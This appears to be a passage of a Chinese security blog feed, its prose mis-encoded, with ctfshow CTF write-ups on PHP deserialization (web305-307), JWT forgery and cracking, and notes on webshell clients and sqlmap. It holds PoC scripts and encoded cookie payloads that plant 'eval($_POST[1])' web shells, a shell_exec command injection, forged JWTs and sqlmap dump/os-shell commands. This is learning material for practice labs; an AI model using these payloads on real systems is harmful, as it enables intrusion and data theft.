class="string">&#x27;dpt_has_cert&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_cert_number&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_cert_number&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_cert_number&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_telephone_number&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_telephone_number&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_telephone_number&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">	<span class="variable">$dpt_name</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_name&#x27;</span>];</span><br><span class="line">	<span class="variable">$dpt_address</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_address&#x27;</span>];</span><br><span class="line">	<span class="variable">$dpt_build_year</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_build_year&#x27;</span>];</span><br><span class="line">	<span class="variable">$dpt_has_cert</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_has_cert&#x27;</span>]==<span class="string">&quot;on&quot;</span>?<span class="string">&quot;1&quot;</span>:<span class="string">&quot;0&quot;</span>;</span><br><span class="line">	<span class="variable">$dpt_cert_number</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_cert_number&#x27;</span>];</span><br><span class="line">	<span class="variable">$dpt_telephone_number</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_telephone_number&#x27;</span>];</span><br><span class="line">	<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;set names utf-8&quot;</span>);</span><br><span class="line">	<span class="variable">$sql</span>=<span class="string">&quot;insert into sds_dpt set sds_name=&#x27;&quot;</span>.<span class="variable">$dpt_name</span>.<span class="string">&quot;&#x27;,sds_address =&#x27;&quot;</span>.<span class="variable">$dpt_address</span>.<span class="string">&quot;&#x27;,sds_build_date=&#x27;&quot;</span>.<span class="variable">$dpt_build_year</span>.<span class="string">&quot;&#x27;,sds_have_safe_card=&#x27;&quot;</span>.<span class="variable">$dpt_has_cert</span>.<span class="string">&quot;&#x27;,sds_safe_card_num=&#x27;&quot;</span>.<span class="variable">$dpt_cert_number</span>.<span class="string">&quot;&#x27;,sds_telephone=&#x27;&quot;</span>.<span class="variable">$dpt_telephone_number</span>.<span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span>=<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$result</span>===<span class="literal">true</span>)&#123;</span><br><span class="line">		<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:dpt.php&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$mysqli</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	 &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ—¢ç„¶éƒ½è¯´æ˜¯æ³¨å…¥ç‚¹äº†ï¼Œæ³¨å…¥ä¸€ä¸‹è¯•è¯•ã€‚</p>
<h2 id="web305"><a href="#web305" class="headerlink" title="web305"></a>web305</h2><p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ³¨å…¥ç‚¹åœ¨checklogin.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user_cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$user_cookie</span>))&#123;</span><br><span class="line">	<span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_cookie</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ååºåˆ—åŒ–å†™è„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public function __construct($u, $p)&#123;</span><br><span class="line">        $this-&gt;username = $u;</span><br><span class="line">        $this-&gt;password = $p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = new user(&#x27;shell.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);</span><br><span class="line">echo urlencode(serialize($s));</span><br></pre></td></tr></table></figure>

<p>run</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D</span><br></pre></td></tr></table></figure>

<p>èšå‰‘è¿æ¥æ•°æ®åº“ï¼Œ</p>
<p>æ•°æ®åº“åœ°å€ï¼šlocahost:3306</p>
<p>ç”¨æˆ·å¯†ç  root root ,æ–‡ä»¶ä¸‹è½½åå¯†ç æ˜¯phpcj,è¿™ä¸ªæ˜¯é”™çš„ï¼Œåº”è¯¥è¿˜æ²¡æ¥å¾—åŠæ”¹</p>
<p>æ‰“å¼€ååœ¨sdsåº“é‡Œçœ‹è§flag</p>
<h2 id="web306"><a href="#web306" class="headerlink" title="web306"></a>web306</h2><p>æ‰¾åˆ°å†™æ–‡ä»¶å‡½æ•°ï¼Œç»§ç»­æ‰¾è°ƒç”¨close()å‡½æ•°çš„ç±»</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class log&#123;</span><br><span class="line">	public $title=&#x27;log.txt&#x27;;</span><br><span class="line">	public $info=&#x27;&#x27;;</span><br><span class="line">	public function loginfo($info)&#123;</span><br><span class="line">		$this-&gt;info=$this-&gt;info.$info;</span><br><span class="line">	&#125;</span><br><span class="line">	public function close()&#123;</span><br><span class="line">		file_put_contents($this-&gt;title, $this-&gt;info);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªç±»é‡Œé¢è¿˜å«æœ‰å¯è°ƒç”¨çš„__construct()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class dao&#123;</span><br><span class="line">	private $config;</span><br><span class="line">	private $conn;</span><br><span class="line"></span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">		$this-&gt;config=new config();</span><br><span class="line">		$this-&gt;init();</span><br><span class="line">	&#125;</span><br><span class="line">	private function init()&#123;</span><br><span class="line">		$this-&gt;conn=new mysqli($this-&gt;config-&gt;get_mysql_host(),$this-&gt;config-&gt;get_mysql_username(),$this-&gt;config-&gt;get_mysql_password(),$this-&gt;config-&gt;get_mysql_db());</span><br><span class="line">	&#125;</span><br><span class="line">	public function __destruct()&#123;</span><br><span class="line">		$this-&gt;conn-&gt;close();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>search unserialize</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$user = unserialize(base64_decode($_COOKIE[&#x27;user&#x27;]));</span><br><span class="line">if($user)&#123;</span><br><span class="line">	header(&quot;location:index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>pocè„šæœ¬ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class dao&#123;</span><br><span class="line">    private $conn;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;conn=new log();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class log&#123;</span><br><span class="line">    public $title=&#x27;a.php&#x27;;</span><br><span class="line">    public $info=&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new dao();</span><br><span class="line">echo base64_encode(serialize($a));</span><br></pre></td></tr></table></figure>

<p>cookieä¼ å‚åˆ°index.php</p>
<p>è®¿é—®a.phpå³å¯</p>
<h2 id="web307"><a href="#web307" class="headerlink" title="web307"></a>web307</h2><p>search file_put_contents</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function closelog()&#123;</span><br><span class="line">		file_put_contents($this-&gt;title, $this-&gt;info);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æ²¡æœåˆ°closelog</p>
<p>æ‰€ä»¥ç”¨ä¸äº†ï¼Œæ¢å‘½ä»¤æ‰§è¡Œå¹»æœ¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">passthru()</span><br><span class="line">pcntl_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ°äº†shell_execï¼Œåœ¨dao.phpä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function  clearCache()&#123;</span><br><span class="line">		shell_exec(&#x27;rm -rf ./&#x27;.$this-&gt;config-&gt;cache_dir.&#x27;/*&#x27;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>æœç´¢ä¸€ä¸‹clearCacheï¼Œåœ¨service.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function clearCache()&#123;</span><br><span class="line">	$this-&gt;dao-&gt;clearCache();</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°åœ¨logout.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$service = unserialize(base64_decode($_COOKIE[&#x27;service&#x27;]));</span><br><span class="line">if($service)&#123;</span><br><span class="line">	$service-&gt;clearCache();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œä¼ å‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://d8c4084b-f6f8-423c-b148-752d4b81eef8.challenge.ctf.show/controller/logout.php</span><br></pre></td></tr></table></figure>

<p>æˆ‘è¯•äº†è¯•ç«ç‹çš„hackbarä¸æ˜¯å¾ˆå¥½ç”¨ï¼Œcookieä¼ å‚ç©¿äº†å¥½ä¹…éƒ½æ²¡è¿›å»ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class config&#123;</span><br><span class="line">    public $cache_dir = &#x27;;echo \&#x27;&lt;?php eval($_POST[1]);?&gt;\&#x27; &gt; 1.php;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class dao&#123;</span><br><span class="line">    private $config;</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">		$this-&gt;config=new config();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new dao();</span><br><span class="line">echo base64_encode(serialize($a));</span><br></pre></td></tr></table></figure>

<p>åŒæ ·ç”Ÿæˆçš„1.phpä¹Ÿåœ¨controllerä¸‹</p>
<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service=TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czo5OiJjYWNoZV9kaXIiO3M6NDE6IjtlY2hvICc8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4nID4gMS5waHA7Ijt9fQ==</span><br></pre></td></tr></table></figure>

<p>ctfshow{b1869c93-377b-4431-8257-c7475286bb2e}</p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>jwt</title>
    <url>/2023/03/15/jwt/</url>
    <content><![CDATA[<p>   ctfshow jwt</p>
<p>â€‹    <span id="more"></span></p>
<p>jwtå’Œcookieéƒ½æ˜¯æˆåŠŸç™»å½•åæœåŠ¡å™¨ç«¯è¿”å›å®¢æˆ·ç«¯çš„ä¸€æ®µæ•°æ®ï¼Œ ä¸‹æ¬¡ç™»å½•æ—¶é¿å…é‡æ–°è¾“å…¥è´¦å·å¯†ç ä¹‹ç±»ï¼Œæé«˜ç”¨æˆ·ä½“éªŒ<br>cookieæœ¬èº«ä¸å…·æœ‰å±å®³æ€§ï¼Œä½†æ˜¯é€šè¿‡å…¶ä»–æ‰‹æ®µxssç­‰è·å–åˆ°å¯¹æ–¹ç›¸å…³ç½‘ç«™çš„cookieåï¼Œå³å¯å®ç°å…å¯†ç ç™»å½•ï¼Œ<br>jwtç”±äºåŠ å¯†çš„ç‰¹æ®Šæ€§å¯èƒ½ä¼šé€ æˆè¶Šæƒç™»å½•ï¼Œè¶Šæƒä¿®æ”¹ç­‰å±å®³<br>jwtè¯­å¥å¾ˆå¥½è¾¨è®¤ï¼Œä¸»è¦æœ‰ä¸‰éƒ¨åˆ†ç»„æˆï¼Œå‰ä¸¤éƒ¨åˆ†ç”±base64åŠ å¯†ï¼Œæœ€åä¸€æ®µä¸ºkeyåŠ å¯†(å¯ä»¥ç†è§£ä¸ºmd5åŠ ç›åŠ å¯†)ï¼Œä¸­é—´ä½¿ç”¨ç‚¹.æˆªæ–­ï¼Œå¹¶ä¸”å‰ä¸¤ä½å­—ç¬¦ä¸ºewï¼ˆ{ï¼‰ï¼Œä¸€èˆ¬å­˜åœ¨äºè¯·æ±‚åŒ…ï¼ˆè¿”å›åŒ…ï¼‰ä¸­çš„cookieå±æ€§å€¼ä¸­<br><a href="https://blog.csdn.net/qq_54030686/article/details/122550173">https://blog.csdn.net/qq_54030686/article/details/122550173</a></p>
<p>jwtç”±ä¸‰éƒ¨åˆ†ç»„æˆ<a href="https://so.csdn.net/so/search?q=header&spm=1001.2101.3001.7020">header</a>ã€payloadã€signature</p>
<p>jwtè§£å¯†ç½‘ç«™<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p>
<h2 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;None&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;jwt&quot;</span><br><span class="line">&#125;</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;iss&quot;: &quot;admin&quot;,</span><br><span class="line">    &quot;iat&quot;: 1678972257,</span><br><span class="line">    &quot;exp&quot;: 1678979457,</span><br><span class="line">    &quot;nbf&quot;: 1678972257,</span><br><span class="line">    &quot;sub&quot;: &quot;user&quot;,  //ä¿®æ”¹ä¸ºadmin</span><br><span class="line">    &quot;jti&quot;: &quot;9cf456cedd0952af77d1abc40b53c4da&quot;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>bpæŠ“url&#x2F;adminçš„åŒ…å¾—åˆ°cookieå€¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;</span><br><span class="line">&#125;</span><br><span class="line">æ ‡å‡†ä¸­æ³¨å†Œçš„å£°æ˜ (å»ºè®®ä½†ä¸å¼ºåˆ¶ä½¿ç”¨) </span><br><span class="line"># iss: jwtç­¾å‘è€…</span><br><span class="line"># sub: jwtæ‰€é¢å‘çš„ç”¨æˆ·</span><br><span class="line"># aud: æ¥æ”¶jwtçš„ä¸€æ–¹</span><br><span class="line"># exp: jwtçš„è¿‡æœŸæ—¶é—´ï¼Œè¿™ä¸ªè¿‡æœŸæ—¶é—´å¿…é¡»è¦å¤§äºç­¾å‘æ—¶é—´</span><br><span class="line"># nbf: å®šä¹‰åœ¨ä»€ä¹ˆæ—¶é—´ä¹‹å‰ï¼Œè¯¥jwtéƒ½æ˜¯ä¸å¯ç”¨çš„</span><br><span class="line"># iat: jwtçš„ç­¾å‘æ—¶é—´</span><br><span class="line"># jti: jwtçš„å”¯ä¸€èº«ä»½æ ‡è¯†ï¼Œä¸»è¦ç”¨æ¥ä½œä¸ºä¸€æ¬¡æ€§token,ä»è€Œå›é¿é‡æ”¾æ”»å‡»</span><br></pre></td></tr></table></figure>

<p>åbase64åŠ å¯†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ewogICJhbGciOiAiTm9uZSIsCiAgInR5cCI6ICJqd3QiCn0KWwogIHsKICAgICJpc3MiOiAiYWRtaW4iLAogICAgImlhdCI6IDE2Nzg5NzIyNTcsCiAgICAiZXhwIjogMTY3ODk3OTQ1NywKICAgICJuYmYiOiAxNjc4OTcyMjU3LAogICAgInN1YiI6ICJhZG1pbiIsICAKICAgICJqdGkiOiAiOWNmNDU2Y2VkZDA5NTJhZjc3ZDFhYmM0MGI1M2M0ZGEiCiAgfQpd</span><br></pre></td></tr></table></figure>

<p>å‘é€</p>
<p>ctfshow{0f11af98-e3f2-4f85-b8f6-1a6e5e29e8ab}</p>
<h2 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h2><p>å¯†ç æ˜¯123456</p>
<p>ctfshow{d0771945-aa69-41d1-97b2-5560debfa46f}</p>
<h2 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h2><p>åŒä¸Š</p>
<h2 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h2><p>c-jwt-crackerä½¿ç”¨</p>
<p>â€œalgâ€: â€œHS256â€,ä¸ºå¯¹ç§°åŠ å¯†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY3OTA1ODI4NywiZXhwIjoxNjc5MDY1NDg3LCJuYmYiOjE2NzkwNTgyODcsInN1YiI6InVzZXIiLCJqdGkiOiI1ZmNhNmQ2N2YzOGI0YWM0MmFhMThiMTA0NTcwMjNmNCJ9.PO3xD4-JJArJXohbOhKr93x8exeCRFMg8XV8yGYGZSE</span><br></pre></td></tr></table></figure>

<p>çˆ†ç ´å‡ºæ¥å¯†ç ä¸ºaaab</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY3OTA1ODI4NywiZXhwIjoxNjc5MDY1NDg3LCJuYmYiOjE2NzkwNTgyODcsInN1YiI6ImFkbWluIiwianRpIjoiNWZjYTZkNjdmMzhiNGFjNDJhYTE4YjEwNDU3MDIzZjQifQ.psZF-TG9DIQKj_GHhyHGXwoGITOJI7Lhf3vP9n2iyRA</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/brendan-rius/c-jwt-cracker">GitHub - brendan-rius&#x2F;c-jwt-crackerï¼šç”¨ C ç¼–å†™çš„ JWT è›®åŠ›ç ´è§£å™¨</a></p>
<p><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p>
<p>å…·ä½“å®‰è£…çœ‹ubuntu</p>
<p>ctfshow{138f48e1-f877-49fe-938f-94e0143ec751}</p>
<h2 id="web349"><a href="#web349" class="headerlink" title="web349"></a>web349</h2>]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>jwt</tag>
      </tags>
  </entry>
  <entry>
    <title>kaliå·¥å…·</title>
    <url>/2023/04/03/kali%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[  <span id="more"></span>

<h2 id="èšå‰‘ä¸‹è½½"><a href="#èšå‰‘ä¸‹è½½" class="headerlink" title="èšå‰‘ä¸‹è½½"></a>èšå‰‘ä¸‹è½½</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://gitee.com/AntSwordProject/AntSword-Loader</span><br></pre></td></tr></table></figure>

<h2 id="behinderä½¿ç”¨"><a href="#behinderä½¿ç”¨" class="headerlink" title="behinderä½¿ç”¨"></a>behinderä½¿ç”¨</h2><p>ä¸‹è½½åœ°å€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/rebeyond/Behinder/releases</span><br></pre></td></tr></table></figure>

<p>ç”±äºè‡ªå·±å†windosä¸‹å¼„ä¸å¥½å†³å®šå¼„åˆ°kaliä¸Šï¼Œkaliæ²¡æœ‰javaç¯å¢ƒéœ€è¦é…ç½®javaç¯å¢ƒ</p>
<p>ä¸‹è½½è§£å‹ï¼Œåœ¨ç›®å½•é‡Œæ‰“å¼€ç»ˆç«¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar Behinder.jar</span><br></pre></td></tr></table></figure>

<p>behinder æ™®é€šçš„åé—¨æ˜¯ç”¨ä¸äº†åªèƒ½ç”¨behinderçš„åé—¨è¿æ¥</p>
<h2 id="sqlmapä½¿ç”¨"><a href="#sqlmapä½¿ç”¨" class="headerlink" title="sqlmapä½¿ç”¨"></a>sqlmapä½¿ç”¨</h2><p>sqlmapå¸¸ç”¨å‘½ä»¤æ€»ç»“ï¼š<br>æ³¨æ„ï¼šå‘½ä»¤ä¸ºkali linuxä¸­è¿è¡Œçš„ ï¼ˆwindowsä¸­ç”¨python sqlmap.pyæ‰§è¡Œï¼‰</p>
<p>1#ã€æ³¨å…¥å…­è¿ï¼š</p>
<ol>
<li><p>sqlmap -u  â€œ<a href="http://www.xx.com/?id=x">http://www.xx.com?id=x</a>â€œ    ã€æŸ¥è¯¢æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹</p>
</li>
<li><p>â€“dbs         ã€æ£€æµ‹ç«™ç‚¹åŒ…å«å“ªäº›æ•°æ®åº“</p>
</li>
<li><p>â€“current-db    ã€è·å–å½“å‰çš„æ•°æ®åº“å</p>
</li>
<li><p>â€“tables -D â€œdb_nameâ€  ã€è·å–æŒ‡å®šæ•°æ®åº“ä¸­çš„è¡¨å -Dåæ¥æŒ‡å®šçš„æ•°æ®åº“åç§°</p>
</li>
<li><p>â€“columns  -T â€œtable_nameâ€ -D â€œdb_nameâ€  ã€è·å–æ•°æ®åº“è¡¨ä¸­çš„å­—æ®µ</p>
</li>
<li><p>â€“dump -C â€œcolumns_nameâ€ -T â€œtable_nameâ€ -D â€œdb_nameâ€  ã€è·å–å­—æ®µçš„æ•°æ®å†…å®¹</p>
</li>
</ol>
<p>2#ã€COOKIEæ³¨å…¥ï¼š<br>sqlmap -u â€œ<a href="http://www.xx.com/?id=x">http://www.xx.com?id=x</a>â€œ â€“cookie â€œcookieâ€ â€“level 2  ã€cookieæ³¨å…¥ åæ¥cookieå€¼</p>
<p>3#ã€POSTæ³¨å…¥ï¼š<br>ï¼ˆ1ï¼‰ç›®æ ‡åœ°å€http:&#x2F;&#x2F; <a href="http://www.xxx.com/">www.xxx.com</a> &#x2F;login.asp<br>ï¼ˆ2ï¼‰æ‰“å¼€brupä»£ç†ã€‚<br>ï¼ˆ3ï¼‰ç‚¹å‡»è¡¨å•æäº¤<br>ï¼ˆ4ï¼‰burpè·å–æ‹¦æˆªä¿¡æ¯ï¼ˆpostï¼‰<br>ï¼ˆ5ï¼‰å³é”®ä¿å­˜æ–‡ä»¶ï¼ˆ.txtï¼‰åˆ°æŒ‡å®šç›®å½•ä¸‹<br>ï¼ˆ6ï¼‰è¿è¡Œsqlmapå¹¶æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š<br>ç”¨ä¾‹ï¼šsqlmap -r okay.txt  -p  username</p>
<p>&#x2F;&#x2F; -rè¡¨ç¤ºåŠ è½½æ–‡ä»¶(åŠæ­¥éª¤ï¼ˆ5ï¼‰ä¿å­˜çš„è·¯å¾„)ï¼Œ-pæŒ‡å®šå‚æ•°ï¼ˆå³æ‹¦æˆªçš„postè¯·æ±‚ä¸­è¡¨å•æäº¤çš„ç”¨æˆ·åæˆ–å¯†ç ç­‰nameå‚æ•°ï¼‰</p>
<p>ï¼ˆ7ï¼‰è‡ªåŠ¨è·å–è¡¨å•ï¼šâ€“formsè‡ªåŠ¨è·å–è¡¨å•</p>
<p>ä¾‹å¦‚ï¼šsqlmap -u <a href="http://www.xx.com/login.asp">www.xx.com/login.asp</a> â€“forms</p>
<p>ï¼ˆ8ï¼‰æŒ‡å®šå‚æ•°æœç´¢ï¼šâ€“data</p>
<p>ä¾‹å¦‚:sqlmap -u <a href="http://www.xx.com/login.asp">www.xx.com/login.asp</a> â€“data â€œusername&#x3D;1â€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-u æŒ‡å®šç›®æ ‡URL (å¯ä»¥æ˜¯httpåè®®ä¹Ÿå¯ä»¥æ˜¯httpsåè®®)</span><br><span class="line"> </span><br><span class="line">-d è¿æ¥æ•°æ®åº“</span><br><span class="line"> </span><br><span class="line">--dbs åˆ—å‡ºæ‰€æœ‰çš„æ•°æ®åº“</span><br><span class="line"> </span><br><span class="line">--current-db åˆ—å‡ºå½“å‰æ•°æ®åº“</span><br><span class="line"> </span><br><span class="line">--tables åˆ—å‡ºå½“å‰çš„è¡¨</span><br><span class="line"> </span><br><span class="line">--columns åˆ—å‡ºå½“å‰çš„åˆ—</span><br><span class="line"> </span><br><span class="line">-D é€‰æ‹©ä½¿ç”¨å“ªä¸ªæ•°æ®åº“</span><br><span class="line"> </span><br><span class="line">-T é€‰æ‹©ä½¿ç”¨å“ªä¸ªè¡¨</span><br><span class="line"> </span><br><span class="line">-C é€‰æ‹©ä½¿ç”¨å“ªä¸ªåˆ—</span><br><span class="line"> </span><br><span class="line">--dump è·å–å­—æ®µä¸­çš„æ•°æ®</span><br><span class="line"> </span><br><span class="line">--batch è‡ªåŠ¨é€‰æ‹©yes</span><br><span class="line"> </span><br><span class="line">--smart å¯å‘å¼å¿«é€Ÿåˆ¤æ–­ï¼ŒèŠ‚çº¦æµªè´¹æ—¶é—´</span><br><span class="line"> </span><br><span class="line">--forms å°è¯•ä½¿ç”¨postæ³¨å…¥</span><br><span class="line"> </span><br><span class="line">-r åŠ è½½æ–‡ä»¶ä¸­çš„HTTPè¯·æ±‚ï¼ˆæœ¬åœ°ä¿å­˜çš„è¯·æ±‚åŒ…txtæ–‡ä»¶ï¼‰</span><br><span class="line"> </span><br><span class="line">-l åŠ è½½æ–‡ä»¶ä¸­çš„HTTPè¯·æ±‚ï¼ˆæœ¬åœ°ä¿å­˜çš„è¯·æ±‚åŒ…æ—¥å¿—æ–‡ä»¶ï¼‰</span><br><span class="line"> </span><br><span class="line">-g è‡ªåŠ¨è·å–Googleæœç´¢çš„å‰ä¸€ç™¾ä¸ªç»“æœï¼Œå¯¹æœ‰GETå‚æ•°çš„URLæµ‹è¯•</span><br><span class="line"> </span><br><span class="line">-o å¼€å¯æ‰€æœ‰é»˜è®¤æ€§èƒ½ä¼˜åŒ–</span><br><span class="line"> </span><br><span class="line">--tamper è°ƒç”¨è„šæœ¬è¿›è¡Œæ³¨å…¥</span><br><span class="line"> </span><br><span class="line">-v æŒ‡å®šsqlmapçš„å›æ˜¾ç­‰çº§</span><br><span class="line"> </span><br><span class="line">--delay è®¾ç½®å¤šä¹…è®¿é—®ä¸€æ¬¡</span><br><span class="line"> </span><br><span class="line">--os-shell è·å–ä¸»æœºshellï¼Œä¸€èˆ¬ä¸å¤ªå¥½ç”¨ï¼Œå› ä¸ºæ²¡æƒé™</span><br><span class="line"> </span><br><span class="line">-m æ‰¹é‡æ“ä½œ</span><br><span class="line"> </span><br><span class="line">-c æŒ‡å®šé…ç½®æ–‡ä»¶ï¼Œä¼šæŒ‰ç…§è¯¥é…ç½®æ–‡ä»¶æ‰§è¡ŒåŠ¨ä½œ</span><br><span class="line"> </span><br><span class="line">-data dataæŒ‡å®šçš„æ•°æ®ä¼šå½“åšpostæ•°æ®æäº¤</span><br><span class="line"> </span><br><span class="line">-timeout è®¾å®šè¶…æ—¶æ—¶é—´</span><br><span class="line"> </span><br><span class="line">--level è®¾ç½®æ³¨å…¥æ¢æµ‹ç­‰çº§</span><br><span class="line"> </span><br><span class="line">--risk é£é™©ç­‰çº§</span><br><span class="line"> 